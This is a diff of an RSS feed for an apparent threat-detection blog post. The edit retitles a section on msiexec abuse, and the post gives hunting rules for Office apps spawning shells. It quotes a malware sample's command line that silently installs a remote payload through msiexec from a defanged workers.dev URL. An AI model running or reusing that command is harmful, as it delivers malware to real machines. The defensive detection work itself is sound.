@@ -17,7 +17,7 @@
         
         
         
-        <lastBuildDate>Thu, 21 Sep 2023 20:37:27 &#43;0300</lastBuildDate>
+        <lastBuildDate>Thu, 21 Sep 2023 20:51:53 &#43;0300</lastBuildDate>
         
             <atom:link rel="self" type="application/rss&#43;xml" href="https://netuserdoomdesire.github.io/rss.xml" />
         
@@ -43,8 +43,8 @@ https://tria.ge/230919-tddlnacb87/behavioral2
 process_name == powershell.exe
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt; Of course, in general, this is a detection that should not be limited to Microsoft Word and should not be limited to only powershell.exe. MS executables such as excel.exe, powerpnt.exe, outlook.exe, spawning cmd.exe, pwsh.exe, cscript.exe, wscript.exe or other processes they should not be spawing, can also be added to the detection. &lt;/p&gt;
 &lt;hr&gt;
-&lt;h1 id=&#34;detection-2-msiexec-file-download&#34;&gt;Detection 2: Msiexec File Download&lt;/h1&gt;
-&lt;p&gt; The second sample started with the execution of an .lnk file, spawning &lt;b&gt;msiexec.exe&lt;/b&gt; and then downloading and executing a payload:
+&lt;h1 id=&#34;detection-2-msiexec-remote-file-execute&#34;&gt;Detection 2: Msiexec Remote File Execute&lt;/h1&gt;
+&lt;p&gt; The second sample started with the execution of an .lnk file, spawning &lt;b&gt;msiexec.exe&lt;/b&gt; and then connecting to a remote server and executing a payload:
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\msiexec.exe&amp;#34; /i hxxp://black-sun-a335[.]asyorfplmnv[.]workers[.]dev/mnwODBptK6jU/5hwtrLyyHFiv/7b0985c861986ec9e2087ade8273e544009d68e1/SsdxxIp8DqeQ.jpg /q
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can hunt for the following:&lt;/p&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;process_name == msiexec.exe
